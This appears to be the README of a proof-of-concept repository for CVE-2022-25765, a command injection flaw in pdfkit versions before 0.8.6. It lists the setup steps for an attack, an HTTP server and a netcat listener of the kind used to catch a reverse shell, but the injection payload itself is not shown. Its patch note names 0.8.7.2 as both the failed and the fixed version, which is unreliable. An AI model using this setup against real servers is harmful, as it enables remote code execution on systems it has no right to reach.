# PDFkit-CMD-Injection
CVE-2022-25765 pdfkit &lt;0.8.6 command injection.


The package pdfkit is vulnerable to Command Injection where the URL is not properly sanitized.

Note: This issue was patched in 0.8.7.2, but the patch was discovered to be ineffective. The updated patch version is 0.8.7.2

## PoC

Start a HTTP server
```
python3 -m http.server 80
```

Start a netcat listener
```
nc -nlvp 4444
```





